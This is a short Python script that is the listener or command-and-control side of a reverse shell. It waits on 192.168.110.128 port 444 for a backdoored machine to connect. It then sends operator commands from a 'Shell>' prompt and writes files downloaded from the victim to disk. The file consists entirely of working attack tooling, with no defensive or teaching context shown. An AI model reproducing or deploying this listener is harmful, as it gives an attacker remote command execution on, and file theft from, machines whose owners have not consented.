import socket
import sys

class Listener:

    def __init__(self, ip, port):
    
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))

        listener.listen(0)

        print('[*] Listening for incoming connections...')

        self.connection, address = listener.accept()

        print('[*] Got a connection from '+ str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode())  # Don't split command
        if command == "exit":
            self.connection.close()
            sys.exit()
        return self.connection.recv(1024)
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content)
        return '[*]Download successfully.'


    def run(self):
        while True:
            command = input("Shell> ")
            result = self.execute_remotely(command)

            if command.startswith("download"):
            # check if the result is an error string
                if result.startswith(b"__ERROR__"):
                    print(result.decode())
                else:
                    file_name = command.split(" ")[1]
                    message = self.write_file(file_name, result)
                    print(message)
            else:
                print(result.decode())


        
my_listener = Listener("192.168.110.128", 444)
my_listener.run()